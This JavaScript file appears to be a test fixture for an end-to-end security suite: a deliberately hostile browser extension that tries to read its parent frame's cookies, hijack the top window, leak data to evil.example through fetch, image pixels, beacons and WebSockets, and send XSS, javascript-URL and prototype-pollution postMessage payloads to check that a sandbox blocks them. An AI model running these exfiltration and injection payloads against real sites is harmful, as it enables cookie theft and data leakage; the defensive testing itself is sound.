// A hostile extension: every way out of its origin it can think of. Each
// attack records what happened in window.__results, read by
// web/dev/e2e-ext-security.mjs; the ones that need a click or that would end
// the page are left as window.__attack.* for the e2e to call.
window.__results = { violations: [] }
const r = window.__results
document.addEventListener('securitypolicyviolation', (e) => {
  r.violations.push(`${e.effectiveDirective} ${e.blockedURI}`)
})

const tryIt = (name, fn) => {
  try {
    const v = fn()
    r[name] = v === undefined ? 'ran' : `read: ${String(v).slice(0, 80)}`
  } catch (e) {
    r[name] = `threw ${e && e.name}`
  }
}

tryIt('parentDocument', () => window.parent.document.cookie)
tryIt('parentLocalStorage', () => window.parent.localStorage.length)
tryIt('parentLocation', () => window.parent.location.href)
tryIt('topLocation', () => { window.top.location = 'http://127.0.0.1:8096/?pwned=top' })
tryIt('topLocationReplace', () => { window.top.location.replace('http://127.0.0.1:8096/?pwned=replace') })
tryIt('openTop', () => { window.open('http://127.0.0.1:8096/?pwned=open', '_top') })
tryIt('eval', () => eval('1 + 1'))
tryIt('alert', () => { window.alert('pwned') })
tryIt('cookie', () => { document.cookie = 'maligna=1'; return document.cookie })
tryIt('ownStorage', () => localStorage.getItem('segredo'))

const inline = document.createElement('script')
inline.textContent = 'window.__results.inlineRan = true'
document.head.append(inline)

const img = new Image()
img.src = 'https://evil.example/px.gif?leak=1'
document.body.append(img)

const neighbour = document.createElement('iframe')
neighbour.src = window.__neighbour || 'http://example.localhost:8788/'
document.body.append(neighbour)

const settle = (p) => p.then(() => 'went through', (e) => `refused ${e && e.name}`)

Promise.all([
  settle(fetch('https://evil.example/collect?leak=1', { mode: 'no-cors' })).then((v) => { r.fetchUndeclared = v }),
  settle(fetch('http://127.0.0.1:8096/api/config')).then((v) => { r.fetchJuntos = v }),
  Promise.resolve().then(() => { navigator.sendBeacon('https://evil.example/beacon', 'x') }).catch(() => {}),
  new Promise((done) => {
    try {
      const ws = new WebSocket('wss://evil.example/ws')
      ws.onerror = () => done()
      setTimeout(done, 1500)
    } catch (e) {
      r.websocket = `threw ${e && e.name}`
      done()
    }
  }),
]).then(() => setTimeout(() => { r.done = true }, 500))

window.juntos.ready()

const play = (extra) => window.parent.postMessage({ juntos: 1, type: 'play', title: 'x', ref: '1', source: { kind: 'hls', url: 'https://cdn.media.example/ep/ok.m3u8' }, ...extra }, '*')
const huge = 'a'.repeat(1 << 20)

window.__attack = {
  popup() {
    r.popup = window.open('./popup.html', 'maligna-popup') ? 'opened' : 'blocked'
  },
  form() {
    document.getElementById('form').submit()
  },
  topLink() {
    document.getElementById('top-link').click()
  },
  metaRefresh() {
    const meta = document.createElement('meta')
    meta.httpEquiv = 'refresh'
    meta.content = '0;url=http://127.0.0.1:8096/'
    document.head.append(meta)
  },
  // Messages juntos must drop, one by one.
  hostileMessages() {
    const source = (url, kind = 'hls') => ({ source: { kind, url } })
    const sent = [
      { juntos: 2, type: 'play', title: 'x', ref: '1', ...source('https://cdn.media.example/ep/ok.m3u8') },
      { juntos: '1', type: 'play', title: 'x', ref: '1', ...source('https://cdn.media.example/ep/ok.m3u8') },
      ['play'],
      42,
      'play',
      null,
    ]
    for (const message of sent) window.parent.postMessage(message, '*')
    play(source('javascript:top.__pwned=1'))
    play(source('data:application/vnd.apple.mpegurl;base64,I0VYVE0zVQ=='))
    play(source(URL.createObjectURL(new Blob(['#EXTM3U']))))
    play(source('http://cdn.media.example/ep/ok.m3u8'))
    play(source('https://evil.example/ep/ok.m3u8'))
    play(source('https://cdn.media.example.evil.example/ep/ok.m3u8'))
    play(source('https://u:p@cdn.media.example/ep/ok.m3u8'))
    play(source('https://cdn.media.example:8443/ep/ok.m3u8'))
    play(source('http://127.0.0.1:8096/api/config'))
    play(source('https://cdn.media.example/ep/ok.m3u8', 'dash'))
    play({ title: huge })
    play({ ref: huge })
    play({ title: ['x'] })
    play({ title: 7 })
    play({ poster: 'https://evil.example/p.jpg' })
    play({ poster: 'javascript:top.__pwned=1' })
    window.parent.postMessage(JSON.parse('{"juntos":1,"type":"play","title":"x","ref":"1","__proto__":{"source":{"kind":"hls","url":"https://cdn.media.example/ep/ok.m3u8"}}}'), '*')
    window.parent.postMessage({ juntos: 1, type: 'toast', text: huge }, '*')
    return sent.length + 20
  },
  // A playlist on the declared host that leads to juntos itself and to the local network.
  leakyPlaylist() {
    play({ title: 'vazamento', ...{ source: { kind: 'hls', url: 'https://cdn.media.example/ep/leak.m3u8' } } })
  },
  // The one that should pass: HTML in the title must stay text.
  htmlTitle(title) {
    play({ title, subtitle: '"><svg onload=top.__pwned=1>' })
  },
}
